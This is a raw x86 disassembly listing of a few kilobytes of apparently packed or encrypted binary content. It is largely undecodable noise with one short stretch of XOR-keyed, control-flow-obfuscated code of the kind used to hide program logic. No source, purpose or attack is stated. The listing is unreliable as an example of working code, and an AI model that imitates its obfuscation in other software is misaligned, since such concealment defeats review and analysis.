  4133ae:	lods   al,BYTE PTR ds:[esi]
  4133af:	fnstenv [ebx]
  4133b1:	inc    edx
  4133b2:	and    DWORD PTR [ebp+0x44],esp
  4133b5:	bound  ecx,QWORD PTR [ebp+0x3a]
  4133b8:	aad    0x64
  4133ba:	mov    al,ds:0x356c2638
  4133bf:	push   ds
  4133c0:	mov    ch,0xbf
  4133c2:	loope  0x41343d
  4133c4:	fld    DWORD PTR [edx]
  4133c6:	adc    DWORD PTR [eax],edx
  4133c8:	cmp    bl,BYTE PTR [edi+edi*8+0x69]
  4133cc:	push   ds
  4133cd:	mov    al,ds:0xbf2cace7
  4133d2:	mov    dl,0x4c
  4133d4:	push   0xfffffff4
  4133d6:	pop    ebx
  4133d7:	xchg   esp,eax
  4133d8:	jae    0x413442
  4133da:	outs   dx,BYTE PTR ds:[esi]
  4133db:	sbb    DWORD PTR [eax+0x58],eax
  4133de:	or     DWORD PTR [ebp+0x6138a461],edi
  4133e4:	rcr    DWORD PTR [esi+ebp*1],cl
  4133e7:	jae    0x4133a5
  4133e9:	(bad)  
  4133ea:	in     al,dx
  4133eb:	cmp    ebx,DWORD PTR [esi-0x85f6fe8]
  4133f1:	or     dl,BYTE PTR [ebx-0x302d643f]
  4133f7:	sub    bh,0xf5
  4133fa:	xchg   edx,eax
  4133fb:	pop    es
  4133fc:	pop    ds
  4133fd:	add    eax,0x943897f9
  413402:	xchg   esi,eax
  413403:	mov    dh,0x8d
  413405:	scas   eax,DWORD PTR es:[edi]
  413406:	retf   0x8d47
  413409:	aaa    
  41340a:	inc    ebp
  41340b:	and    edx,ebp
  41340d:	or     eax,0x849dac6a
  413412:	or     edx,DWORD PTR [ecx]
  413414:	mov    eax,ebx
  413416:	in     al,0xc7
  413418:	mov    ecx,0xa6184936
  41341d:	sbb    dl,BYTE PTR [edx+edi*8-0x61]
  413421:	push   ds
  413422:	in     eax,dx
  413423:	add    ch,BYTE PTR [ebp-0x7ed0e95c]
  413429:	std    
  41342a:	fnstenv [edx+0x26]
  41342d:	jbe    0x4133ca
  41342f:	fs jns 0x413499
  413432:	ins    DWORD PTR es:[edi],dx
  413433:	test   ax,0x4bb8
  413437:	in     al,0xc5
  413439:	dec    eax
  41343a:	jo     0x413400
  41343c:	cmp    ebx,DWORD PTR [ebp-0x3e76b92d]
  413442:	pop    eax
  413443:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413444:	aaa    
  413445:	xlat   BYTE PTR ds:[ebx]
  413446:	and    BYTE PTR [ecx],bh
  413448:	int3   
  413449:	jmp    0xd24c:0xeca9e686
  413450:	call   0xd907:0x61dfc268
  413457:	pusha  
  413458:	in     al,0x1f
  41345a:	mov    ds:0x446f2800,eax
  41345f:	xchg   ebp,eax
  413460:	bound  edx,QWORD PTR [edx+0x6636a3a3]
  413466:	push   edx
  413467:	in     eax,dx
  413468:	(bad)  
  413469:	mov    edx,0x7d94f213
  41346e:	xor    eax,0x208e69bd
  413474:	sbb    DWORD PTR [eax],ebp
  413476:	cs xor esp,edi
  413479:	sbb    eax,0xa4579957
  41347e:	fsub   QWORD PTR [eax-0x19]
  413481:	leave  
  413482:	in     eax,0x3e
  413484:	sub    BYTE PTR [edx],cl
  413486:	cld    
  413487:	cmp    edi,DWORD PTR [edi]
  413489:	scas   al,BYTE PTR es:[edi]
  41348a:	and    DWORD PTR [eax+ebx*2-0x15c28d67],esi
  413491:	popa   
  413492:	ret    
  413493:	cwde   
  413494:	xchg   esi,eax
  413495:	xchg   esi,eax
  413496:	or     ecx,DWORD PTR [ecx-0x4e912afc]
  41349c:	ds sbb al,0x71
  41349f:	je     0x41351f
  4134a1:	sti    
  4134a2:	loopne 0x413494
  4134a4:	inc    ecx
  4134a5:	dec    ebp
  4134a6:	pop    esp
  4134a7:	bnd jg 0x4134b1
  4134aa:	popa   
  4134ab:	xchg   edi,eax
  4134ac:	pop    ebx
  4134ad:	xchg   edi,eax
  4134ae:	cdq    
  4134af:	rcr    BYTE PTR [esi],1
  4134b1:	jb     0x413523
  4134b3:	lahf   
  4134b4:	push   edi
  4134b5:	jmp    0x3104:0x3e04eef4
  4134bc:	ficom  DWORD PTR [ebp+0x154fc60b]
  4134c2:	xchg   ecx,eax
  4134c3:	int    0x7f
  4134c5:	addr16 dec edx
  4134c7:	nop
  4134c8:	mov    DWORD PTR [edx+0x28],ebx
  4134cb:	lock or BYTE PTR [ebx],bl
  4134ce:	mov    eax,ds:0xe5835717
  4134d3:	out    0xbc,eax
  4134d5:	mov    dl,0x13
  4134d7:	loop   0x4134c9
  4134d9:	inc    eax
  4134da:	jp     0x4134f8
  4134dc:	mov    esi,0x28f29eca
  4134e1:	and    esi,DWORD PTR ds:0x826336d1
  4134e7:	mov    DWORD PTR [esi-0x63a22715],eax
  4134ed:	out    0x1,al
  4134ef:	adc    eax,0x7813eb1c
  4134f4:	ror    al,0x79
  4134f7:	es sahf 
  4134f9:	aad    0x6b
  4134fb:	cs mov dl,0xbf
  4134fe:	bnd jge 0x4134cf
  413501:	add    eax,ebp
  413503:	cmp    eax,0x8f792b16
  413508:	clc    
  413509:	shl    edx,cl
  41350b:	sbb    esi,DWORD PTR [ecx+0x74]
  41350e:	pop    ebp
  41350f:	xchg   ebp,eax
  413510:	jnp    0x41349e
  413512:	icebp  
  413513:	and    edi,eax
  413515:	das    
  413516:	in     al,dx
  413517:	xchg   edi,eax
  413518:	dec    ebx
  413519:	sahf   
  41351a:	inc    ebp
  41351b:	ss push cs
  41351d:	inc    esi
  41351e:	pushf  
  41351f:	(bad)  
  413520:	icebp  
  413521:	push   cs
  413522:	jb     0x4134b1
  413524:	pop    eax
  413525:	es xchg ebp,eax
  413527:	mov    esi,0x4173f4ce
  41352c:	pop    es
  41352d:	cdq    
  41352e:	or     ebp,ebx
  413530:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413531:	dec    BYTE PTR [esi+0xa7fb66]
  413537:	into   
  413538:	mov    eax,0x36ab73c3
  41353d:	in     eax,dx
  41353e:	add    DWORD PTR [eax],0x7486a52b
  413544:	pop    esi
  413545:	mov    esp,0xfb4d2143
  41354a:	adc    DWORD PTR [ecx+0x1e],0x876125d0
  413551:	fdivp  st(3),st
  413553:	push   0x3c
  413555:	imul   eax,ecx,0xb38469a6
  41355b:	mov    esp,DWORD PTR [edi+edi*1]
  41355e:	inc    esi
  41355f:	mov    edx,0x69c35f8b
  413564:	xchg   ebx,eax
  413565:	fsub   QWORD PTR [ebx]
  413567:	mov    dh,0x36
  413569:	push   eax
  41356a:	test   dl,dl
  41356c:	and    al,BYTE PTR [edx+0x5e50e5a1]
  413572:	xor    eax,0xab9f6a1f
  413577:	into   
  413578:	aas    
  413579:	repnz retf 0x12c4
  41357d:	push   0xffffff9e
  41357f:	fbld   TBYTE PTR [edx-0x75]
  413582:	stc    
  413583:	shl    BYTE PTR [edx+0xb440133],cl
  413589:	and    al,0x86
  41358b:	cmp    DWORD PTR [edi+0x73],edx
  41358e:	pop    ebx
  41358f:	and    cl,BYTE PTR [esi+0x0]
  413592:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413594:	ret    
  413595:	adc    BYTE PTR [ebx+0x29e1f890],0x6e
  41359c:	je     0x413590
  41359e:	cld    
  41359f:	pop    esi
  4135a0:	xchg   esi,eax
  4135a1:	ret    
  4135a2:	shr    BYTE PTR [eax],1
  4135a4:	es mov esp,0x94c0f096
  4135aa:	push   es
  4135ab:	mov    bh,0xf2
  4135ad:	lods   eax,DWORD PTR ds:[esi]
  4135ae:	jp     0x41358f
  4135b0:	mov    ds:0x94d10298,eax
  4135b5:	cld    
  4135b6:	sub    eax,0xa115dc9c
  4135bb:	pop    ecx
  4135bc:	stc    
  4135bd:	test   al,0x63
  4135bf:	iret   
  4135c0:	aaa    
  4135c1:	mov    bl,0x77
  4135c3:	(bad)  
  4135c4:	std    
  4135c5:	std    
  4135c6:	jp     0x4135fc
  4135c8:	dec    esi
  4135c9:	gs add eax,0x3d720f42
  4135cf:	(bad)  
  4135d0:	adc    al,BYTE PTR [edx-0x31]
  4135d3:	dec    edi
  4135d4:	fild   DWORD PTR [edi+0x569ea6ad]
  4135da:	out    0xe4,al
  4135dc:	pop    ebp
  4135dd:	sub    al,0x6a
  4135df:	jbe    0x41364a
  4135e1:	test   bl,bl
  4135e3:	popa   
  4135e4:	mov    ah,0x76
  4135e6:	fnsave [esi]
  4135e8:	leave  
  4135e9:	aam    0x1a
  4135eb:	inc    ecx
  4135ec:	inc    eax
  4135ed:	icebp  
  4135ee:	sbb    bl,cl
  4135f0:	and    esi,DWORD PTR [ebx+0x68]
  4135f3:	inc    edi
  4135f4:	(bad)  
  4135f5:	sbb    ebp,edi
  4135f7:	push   edi
  4135f8:	push   ebp
  4135f9:	push   ss
  4135fa:	and    bh,BYTE PTR [ebx]
  4135fc:	inc    ecx
  4135fd:	inc    ebx
  4135fe:	(bad)  
  4135ff:	or     bl,BYTE PTR [ebx]
  413601:	sub    BYTE PTR [edx+ecx*8-0x31],al
  413605:	jo     0x4135a8
  413607:	ffreep st(5)
  413609:	mov    cl,0x9a
  41360b:	shr    dh,0xac
  41360e:	cmp    al,0x25
  413610:	scas   al,BYTE PTR es:[edi]
  413611:	cmp    DWORD PTR [ecx+eiz*8],ebx
  413614:	aad    0x46
  413616:	pop    ebp
  413617:	cmp    eax,DWORD PTR [ebp+0x41]
  41361a:	mov    edx,cs
  41361c:	mov    eax,0xa80d6eaf
  413621:	(bad)  
  413622:	cmc    
  413623:	call   0x293a:0xdd37f229
  41362a:	add    eax,0x2123474f
  41362f:	xchg   esi,eax
  413630:	push   cs
  413631:	icebp  
  413632:	shl    BYTE PTR [esi+ebx*2+0x7f],1
  413636:	xor    eax,0x7938580f
  41363b:	mov    edx,0x545d2bf7
  413640:	sar    BYTE PTR [eax],0x2a
  413643:	addr16 aaa 
  413645:	sub    al,BYTE PTR [esi+0x5d]
  413648:	(bad)  
  413649:	imul   ecx,DWORD PTR [ebp+0x2f],0x95e43d6f
  413650:	daa    
  413651:	inc    ecx
  413652:	sub    eax,0x9cc99836
  413657:	or     dl,dh
  413659:	(bad)  
  41365a:	jecxz  0x413684
  41365c:	ja     0x41360a
  41365e:	inc    eax
  41365f:	psubsb mm0,QWORD PTR [esi+ebx*1+0x54]
  413664:	or     edi,DWORD PTR [ebp+0xd]
  413667:	push   ss
  413668:	call   0x4cdd:0xd7b5f586
  41366f:	push   0xae2fe6a3
  413674:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413675:	jae    0x413665
  413677:	jg     0x4136b0
  413679:	push   es
  41367a:	sub    BYTE PTR [ecx+0x72],ah
  41367d:	mov    al,ds:0x5b3cf9b3
  413682:	test   DWORD PTR [edi+ebp*1-0x7],edx
  413686:	imul   ebx,DWORD PTR [edx+0x4287d33c],0xae54739a
  413690:	je     0x413639
  413692:	xor    al,0xc3
  413694:	cmc    
  413695:	push   ebx
  413696:	dec    esi
  413697:	inc    eax
  413698:	cmc    
  413699:	in     al,dx
  41369a:	loope  0x41363d
  41369c:	in     al,0x4e
  41369e:	adc    eax,0xf1f4a5de
  4136a3:	cli    
  4136a4:	scas   al,BYTE PTR es:[edi]
  4136a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136a6:	les    edx,FWORD PTR [ebx+0x1f]
  4136a9:	clc    
  4136aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136ab:	das    
  4136ac:	lock pop es
  4136ae:	or     bh,BYTE PTR [ebx-0x7688aed3]
  4136b4:	rol    BYTE PTR [edi+ecx*2],1
  4136b7:	div    DWORD PTR [edx-0x5f]
  4136ba:	push   edx
  4136bb:	ret    
  4136bc:	dec    esp
  4136bd:	xchg   edi,eax
  4136be:	fnsave [ebp-0x75]
  4136c1:	pop    ebp
  4136c2:	hlt    
  4136c3:	xor    edx,esi
  4136c5:	add    edx,edi
  4136c7:	imul   edx,ebx
  4136ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4136cd:	mov    BYTE PTR [edx+ebx*1],al
  4136d0:	mov    eax,DWORD PTR [ebp-0x30]
  4136d3:	mov    edx,DWORD PTR [ebp-0x3c]
  4136d6:	xor    eax,esi
  4136d8:	xor    edx,esi
  4136da:	add    eax,edi
  4136dc:	add    edx,edi
  4136de:	imul   eax,edx
  4136e1:	add    eax,DWORD PTR [ebp-0xc]
  4136e4:	mov    DWORD PTR [ebp-0xc],eax
  4136e7:	mov    eax,DWORD PTR [ebp-0xc]
  4136ea:	mov    edx,DWORD PTR [ebp-0x24]
  4136ed:	cmp    edx,eax
  4136ef:	jb     0x411257
  4136f5:	mov    eax,DWORD PTR [ebp-0x3c]
  4136f8:	mov    edx,DWORD PTR [ebp-0x24]
  4136fb:	xor    eax,esi
  4136fd:	add    eax,edi
  4136ff:	imul   eax,edx
  413702:	mov    edx,DWORD PTR [ebp-0x20]
  413705:	xor    edx,esi
  413707:	add    edx,edi
  413709:	or     eax,edx
  41370b:	mov    edx,DWORD PTR [ebp-0x18]
  41370e:	xor    edx,esi
  413710:	add    eax,edx
  413712:	mov    edx,DWORD PTR [ebp-0x18]
  413715:	xor    edx,esi
  413717:	add    eax,edx
  413719:	mov    edx,DWORD PTR [ebp-0x10]
  41371c:	lea    eax,[eax+edx*1+0x64e5b6]
  413723:	jmp    0x413737
  413728:	mov    eax,DWORD PTR [ebp-0x18]
  41372b:	mov    edx,DWORD PTR [ebp-0x10]
  41372e:	xor    eax,esi
  413730:	lea    eax,[eax+edx*1+0x3272db]
  413737:	mov    DWORD PTR [ebp-0x10],eax
  41373a:	jmp    0x4111a4
  41373f:	mov    eax,DWORD PTR [ebp-0x38]
  413742:	mov    edx,DWORD PTR [ebp+0xc]
  413745:	xor    edx,esi
  413747:	lea    ecx,[ecx+edx*1+0x3272db]
  41374e:	lea    edx,[ecx-0x3272db]
  413754:	xor    edx,esi
  413756:	cmp    edx,0xf89c95b6
  41375c:	jne    0x410fde
  413762:	mov    ecx,DWORD PTR [ebp+0x8]
  413765:	mov    edx,DWORD PTR [ebp+0xc]
  413768:	mov    ebx,DWORD PTR [ebp+0x8]
  41376b:	xor    edx,esi
  41376d:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  413774:	xor    ecx,esi
  413776:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41377d:	xor    ebx,esi
  41377f:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  413786:	jmp    0x415b38
  41378b:	xlat   BYTE PTR ds:[ebx]
  41378c:	repz mov bh,0xb2
  41378f:	xchg   ebx,eax
  413790:	mov    fs,WORD PTR [edi+0xef9e63]
  413796:	mov    bl,0xa6
  413798:	int    0x4d
  41379a:	test   al,0xa2
  41379c:	imul   esp,DWORD PTR [edx+0x62],0xffffffcd
  4137a0:	pop    edi
  4137a1:	bound  esp,QWORD PTR [edx-0x19]
  4137a4:	mov    cl,0x71
  4137a6:	stos   BYTE PTR es:[edi],al
  4137a7:	or     BYTE PTR [ebx],0x2a
  4137aa:	xchg   esi,eax
  4137ab:	fsub   st(4),st
  4137ad:	jnp    0x413778
  4137af:	cli    
  4137b0:	ja     0x4137ce
  4137b2:	popaw  
  4137b4:	std    
  4137b5:	jp     0x413742
  4137b7:	(bad)  
  4137b8:	test   al,0x8e
  4137ba:	stos   DWORD PTR es:[edi],eax
  4137bb:	sti    
  4137bc:	mov    esi,0x817dc520
  4137c1:	cmp    eax,0x8acd5ef2
  4137c6:	push   cs
  4137c7:	xor    DWORD PTR [edi],ebx
  4137c9:	mov    eax,0x8587ddea
  4137ce:	inc    edi
  4137cf:	repz mov ds:0x89c85b60,eax
  4137d5:	pop    es
  4137d6:	mov    edi,0xb7424280
  4137db:	pop    ecx
  4137dc:	add    al,ah
  4137de:	std    
  4137df:	mov    ah,0xb8
  4137e1:	ja     0x41383f
  4137e3:	out    0xde,al
  4137e5:	fdiv   QWORD PTR [edi]
  4137e7:	sbb    DWORD PTR [ecx],ebp
  4137e9:	das    
  4137ea:	push   edx
  4137eb:	mov    ecx,0xc1bcb012
  4137f0:	xchg   BYTE PTR [edi],dl
  4137f2:	popf   
  4137f3:	pop    ecx
  4137f4:	inc    ebx
  4137f5:	mov    esi,0x99defdc7
  4137fa:	daa    
  4137fb:	cmp    eax,0x5ed87808
  413800:	dec    esi
  413801:	cld    
  413802:	xchg   esi,eax
  413803:	ins    BYTE PTR es:[edi],dx
  413804:	inc    esi
  413805:	adc    ah,BYTE PTR [eax-0x56]
  413808:	inc    ecx
  413809:	scas   al,BYTE PTR es:[edi]
  41380a:	add    al,0x28
  41380c:	xchg   ebp,eax
  41380d:	stc    
  41380e:	sub    edi,DWORD PTR [eax+0x72]
  413811:	out    dx,eax
  413812:	leave  
  413813:	add    BYTE PTR [edi],0xb2
  413816:	pop    esp
  413817:	cld    
  413818:	shl    DWORD PTR [esp+esi*2],1
  41381b:	pop    es
  41381c:	inc    ebp
  41381d:	xchg   ebx,eax
  41381e:	sub    bl,cl
  413820:	aam    0x5a
  413822:	adc    eax,0xfa9eb9ee
  413827:	jne    0x4137fc
  413829:	mov    ah,0x25
  41382b:	mov    al,0x5a
  41382d:	adc    DWORD PTR [ecx-0x4e8d29e7],ebp
  413833:	and    al,0x25
  413835:	loope  0x413876
  413837:	or     al,0x90
  413839:	stc    
  41383a:	pop    edx
  41383b:	or     al,0xb8
  41383d:	ds push edx
  41383f:	test   eax,0xdac6b2e2
  413844:	push   esp
  413845:	stos   DWORD PTR es:[edi],eax
  413846:	pop    ds
  413847:	xor    DWORD PTR [ecx-0x3],0xbcb49596
  41384e:	fiadd  DWORD PTR [eax+0x6d47a125]
  413854:	push   0x7d0496b5
  413859:	and    DWORD PTR [ebx],edi
  41385b:	xchg   ecx,eax
  41385c:	add    ah,BYTE PTR [edi-0x2d]
  41385f:	sti    
  413860:	mov    ebx,0xc6c31f7f
  413865:	mov    ebx,0xf6a0262b
  41386a:	mov    ds:0xd3d834cb,al
  41386f:	into   
  413870:	push   edx
  413871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413872:	je     0x413873
  413874:	sbb    esp,ecx
  413876:	push   ds
  413877:	dec    esi
  413878:	data16 (bad) 
  41387a:	push   0xffffff82
  41387c:	pop    eax
  41387d:	jo     0x4138c3
  41387f:	adc    ebp,DWORD PTR [eax]
  413881:	mov    al,0xef
  413883:	sahf   
  413884:	dec    ebp
  413885:	jne    0x4138f5
  413887:	stos   BYTE PTR es:[edi],al
  413888:	loop   0x413874
  41388a:	mov    esi,0x80cc8010
  41388f:	pop    ebp
  413890:	shl    bh,0xa1
  413893:	enter  0x15b7,0x23
  413897:	out    dx,eax
  413898:	loopne 0x413893
  41389a:	ins    BYTE PTR es:[edi],dx
  41389b:	sbb    al,0xb0
  41389d:	mov    esp,0xccdb513e
  4138a2:	repnz push edi
  4138a4:	push   ebp
  4138a5:	(bad)  
  4138a6:	xchg   ebp,eax
  4138a7:	ret    
  4138a8:	daa    
  4138a9:	push   esi
  4138aa:	add    al,0xa2
  4138ac:	les    ecx,FWORD PTR [ebx]
  4138ae:	mov    ebx,DWORD PTR [esi]
  4138b0:	int    0x54
  4138b2:	or     eax,0xe3dc7ef1
  4138b7:	je     0x4138d4
  4138b9:	mov    BYTE PTR [ebp+edi*2+0x3940e299],bh
  4138c0:	mov    ecx,0xa2af1d69
  4138c5:	data16 mov WORD PTR [eax+0x52653502],?
  4138cc:	mov    ds:0x8b3fd144,al
  4138d1:	push   esi
  4138d2:	(bad)  [edi+eiz*1]
  4138d5:	jb     0x413859
  4138d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138d8:	pop    ebx
  4138d9:	sti    
  4138da:	inc    edi
  4138db:	pop    esp
  4138dc:	test   BYTE PTR [ebx+0x302aafaf],0xcc
  4138e3:	loop   0x41388b
  4138e5:	(bad)
  4138e9:	es and al,0x8
  4138ec:	sbb    ah,BYTE PTR [esi-0x6e]
  4138ef:	mov    dh,0x6f
  4138f1:	pusha  
  4138f2:	mov    esp,0x6e8757f0
  4138f7:	sub    ecx,DWORD PTR [edi+0x50309d6a]
  4138fd:	inc    eax
  4138fe:	or     ebp,DWORD PTR [edx]
  413900:	shl    BYTE PTR [edx-0x3d],0x7f
  413904:	std    
  413905:	(bad)  
  413906:	mov    al,0x76
  413908:	push   ebp
  413909:	adc    cl,BYTE PTR [eax]
  41390b:	arpl   si,si
  41390d:	fst    QWORD PTR [edi]
  41390f:	mov    esi,0xed97a56b
  413914:	dec    eax
  413915:	push   0xffffff81
  413917:	xor    al,0xf5
  413919:	push   edx
  41391a:	stos   DWORD PTR es:[edi],eax
  41391b:	add    dh,dl
  41391d:	out    dx,eax
  41391e:	jb     0x41390c
  413920:	cmp    ebx,DWORD PTR [edi]
  413922:	inc    esp
  413923:	test   al,0xc0
  413925:	(bad)  
  413926:	out    dx,al
  413927:	cld    
  413928:	call   0xcbf3:0xc180ff4e
  41392f:	add    DWORD PTR [ebp+0x64],edi
  413932:	mov    bh,0x27
  413934:	xchg   edx,eax
  413935:	mov    esi,0x8cab692b
  41393a:	shl    DWORD PTR [esi],0xfc
  41393d:	or     eax,DWORD PTR [edx]
  41393f:	jbe    0x4138f9
  413941:	pop    esi
  413942:	or     ebx,eax
  413944:	push   0xdb3860b7
  413949:	cmc    
  41394a:	inc    ecx
  41394b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41394d:	pushf  
  41394e:	imul   DWORD PTR [edi+0x1d6eb418]
  413954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413955:	std    
  413956:	sahf   
  413957:	push   es
  413958:	mov    ecx,0x3a5de9fa
  41395d:	xor    esp,DWORD PTR ds:0xe84d4832
  413963:	push   es
  413964:	loope  0x413920
  413966:	dec    ecx
  413967:	xchg   ebp,eax
  413968:	and    ebx,DWORD PTR [edi+ebp*1+0x66]
  41396c:	sub    eax,0xe7afd7bd
  413971:	fdivp  st(2),st
  413973:	test   BYTE PTR [ebx],al
  413975:	fisttp QWORD PTR [edx+0x2f]
  413978:	push   eax
  413979:	mov    cl,al
  41397b:	gs aad 0x35
  41397e:	cmc    
  41397f:	push   0x59178fec
  413984:	cmp    al,BYTE PTR [ebp+ebp*4-0x16dcdb9a]
  41398b:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41398d:	adc    eax,0x709bc6cd
  413992:	add    DWORD PTR [ebx+0x8a32a6f],esp
  413998:	or     eax,0xf3f2b9e
  41399d:	ins    BYTE PTR es:[edi],dx
  41399e:	sbb    ecx,DWORD PTR ds:0xb3576c47
  4139a4:	add    eax,0x7c884e41
  4139a9:	shr    BYTE PTR [edi],0x4a
  4139ac:	xchg   edi,eax
  4139ad:	inc    esi
  4139ae:	arpl   WORD PTR [edx+0x57],cx
  4139b1:	cdq    
  4139b2:	jno    0x413947
  4139b4:	mov    dl,0x3a
  4139b6:	inc    esi
  4139b7:	pop    edi
  4139b8:	pop    ebp
  4139b9:	loope  0x41398f
  4139bb:	cmc    
  4139bc:	nop
  4139bd:	rcr    DWORD PTR [esi+ebp*8],1
  4139c0:	rep outs dx,DWORD PTR ds:[esi]
  4139c2:	out    dx,al
  4139c3:	fcmovne st,st(4)
  4139c5:	call   0xdf085c5c
  4139ca:	(bad)  
  4139cb:	adc    edi,eax
  4139cd:	loop   0x413a2e
  4139cf:	in     al,dx
  4139d0:	test   DWORD PTR [ecx],ebp
  4139d2:	inc    ebp
  4139d3:	mov    dh,0x39
  4139d5:	scas   al,BYTE PTR es:[edi]
  4139d6:	or     dl,0x86
  4139d9:	mov    ch,0x10
  4139db:	mov    ch,0x24
  4139dd:	push   ss
  4139de:	(bad)  
  4139df:	retf   0xc6fa
  4139e2:	adc    DWORD PTR [edi],0xffffffae
  4139e5:	rcr    BYTE PTR [ebx-0x4d],0x67
  4139e9:	outs   dx,DWORD PTR ds:[esi]
  4139ea:	call   0x1fd1b2a5
  4139ef:	aaa    
  4139f0:	ins    DWORD PTR es:[edi],dx
  4139f1:	sar    BYTE PTR [esi-0x75023f44],cl
  4139f7:	(bad)  
  4139f8:	popf   
  4139f9:	mov    WORD PTR [eax+0x14],ds
  4139fc:	xor    esi,DWORD PTR [ecx+eiz*1-0xbff4af9]
  413a03:	or     ch,BYTE PTR [esi]
  413a05:	adc    al,0x33
  413a07:	mov    ecx,0xa96716b6
  413a0c:	dec    esi
  413a0d:	out    dx,eax
  413a0e:	and    al,0xae
  413a11:	push   esi
  413a12:	pop    edx
  413a13:	dec    edx
  413a14:	add    cl,BYTE PTR [edi]
  413a16:	mov    al,0xc8
  413a18:	push   ss
  413a19:	xor    DWORD PTR [edi-0x73],0xd3a42a82
  413a20:	jge    0x4139af
  413a22:	xor    esp,edx
  413a24:	jne    0x413a37
  413a26:	sar    BYTE PTR [eax+0x7b17feb9],1
  413a2c:	and    eax,0x9378afc1
  413a31:	shr    DWORD PTR [edx+0x4cbb4f70],cl
  413a37:	(bad)  
  413a38:	js     0x413ab8
  413a3a:	xchg   ebp,eax
  413a3b:	or     eax,0x7ae0a645
  413a40:	daa    
  413a41:	fcomp  QWORD PTR [esi+0x197ed646]
  413a47:	stos   DWORD PTR es:[edi],eax
  413a48:	mov    dl,0x80
  413a4a:	into   
  413a4b:	ficom  DWORD PTR [ebp-0x24]
  413a4e:	sub    al,dl
  413a50:	cmp    al,0x38
  413a52:	in     eax,dx
  413a53:	mov    eax,0x4bb584e0
  413a58:	adc    ecx,edi
  413a5a:	mov    ebp,0xef80785e
  413a5f:	lahf   
  413a60:	outs   dx,DWORD PTR ds:[esi]
  413a61:	in     al,dx
  413a62:	ss push eax
  413a64:	mov    ecx,0x30987fd0
  413a69:	xor    al,0xa2
  413a6b:	lods   eax,DWORD PTR ds:[esi]
  413a6c:	sti    
  413a6d:	push   0x4f4a8b43
  413a72:	jo     0x413ae2
  413a74:	and    al,0xb6
  413a76:	cdq    
  413a77:	cli    
  413a78:	outs   dx,BYTE PTR ds:[esi]
  413a79:	ins    BYTE PTR es:[edi],dx
  413a7a:	pushf  
  413a7b:	cwde   
  413a7c:	pop    eax
  413a7d:	pop    ds
  413a7e:	idiv   BYTE PTR [ecx+0x546e89f5]
  413a84:	leave  
  413a85:	sbb    DWORD PTR [esi+0x54],edi
  413a88:	push   edx
  413a89:	adc    al,0x48
  413a8b:	add    BYTE PTR [edx],ch
  413a8d:	in     al,0x21
  413a8f:	outs   dx,BYTE PTR ds:[esi]
  413a90:	call   0x568e:0x2af496ef
  413a97:	pop    edx
  413a98:	iret   
  413a99:	pop    esi
  413a9a:	inc    ecx
  413a9b:	scas   al,BYTE PTR es:[edi]
  413a9c:	repz retf 0xa746
  413aa0:	inc    ebx
  413aa1:	add    al,0xa3
  413aa3:	loop   0x413a3b
  413aa5:	ins    BYTE PTR es:[edi],dx
  413aa6:	xchg   BYTE PTR [edi],ch
  413aa8:	pop    edx
  413aa9:	push   ebx
  413aaa:	sub    bl,BYTE PTR [ebx-0x52c0918b]
  413ab0:	adc    ecx,DWORD PTR [ebx-0x18]
  413ab3:	sbb    al,0x3e
  413ab5:	xchg   edx,eax
  413ab6:	dec    eax
  413ab7:	or     dh,bl
  413ab9:	dec    esi
  413aba:	mov    ecx,edi
  413abc:	sbb    al,0x82
  413abe:	dec    eax
  413abf:	xchg   esp,eax
  413ac0:	xor    eax,0xe8113520
  413ac5:	or     BYTE PTR [ecx+edi*8],0x66
  413ac9:	xor    ecx,0xffffffdc
  413acc:	mov    esp,0x6a9f1bdf
  413ad1:	call   0x6cdf6bf1
  413ad6:	mov    ebp,0xd8279643
  413adb:	xchg   ebp,eax
  413adc:	sbb    DWORD PTR [eax+ebp*2-0x7d7da76e],ebp
  413ae3:	in     eax,dx
  413ae4:	popa   
  413ae5:	dec    esi
  413ae6:	fs enter 0x2598,0x10
  413aeb:	add    DWORD PTR [esi],esp
  413aed:	dec    esp
  413aee:	push   ds
  413aef:	and    DWORD PTR [esi-0x2b],ecx
  413af2:	adc    eax,edx
  413af4:	out    dx,eax
  413af5:	dec    ecx
  413af6:	jae    0x413b77
  413af8:	adc    esi,DWORD PTR [ebx+eax*4-0x1552fc87]
  413aff:	ror    DWORD PTR [ecx-0x4e],1
  413b02:	sbb    eax,0x50b421a7
  413b07:	xchg   esp,eax
  413b08:	stos   DWORD PTR es:[edi],eax
  413b09:	cmc    
  413b0a:	aad    0x94
  413b0c:	pop    edx
  413b0d:	iret   
  413b0e:	jbe    0x413b3d
  413b10:	jg     0x413b6b
  413b12:	sub    dl,BYTE PTR [edi]
  413b14:	aam    0xbb
  413b16:	arpl   sp,bx
  413b18:	mov    bl,0xf6
  413b1a:	mov    esi,0x4d2bc258
  413b1f:	xor    DWORD PTR [edx+0x49],ebp
  413b22:	inc    eax
  413b23:	pop    ecx
  413b24:	push   esi
  413b25:	stos   BYTE PTR es:[edi],al
  413b26:	push   esp
  413b27:	xchg   ecx,eax
  413b28:	(bad)  
  413b29:	imul   eax,DWORD PTR [esi-0x4a050538],0xe60437b2
  413b33:	sbb    BYTE PTR [edi+ecx*2+0x6a07560d],dh
  413b3a:	pop    es
  413b3b:	sub    dh,BYTE PTR [ebx]
  413b3d:	jne    0x413b57
  413b3f:	push   DWORD PTR [ebx+0x4f2862da]
  413b45:	aas    
  413b46:	sar    eax,cl
  413b48:	dec    edi
  413b49:	cmp    BYTE PTR ss:[eax+0x62],cl
  413b4d:	push   ebp
  413b4e:	gs jo  0x413bd0
  413b51:	inc    eax
  413b52:	xchg   edx,eax
  413b53:	out    0x87,eax
  413b55:	les    ebx,FWORD PTR ds:0x20b148bb
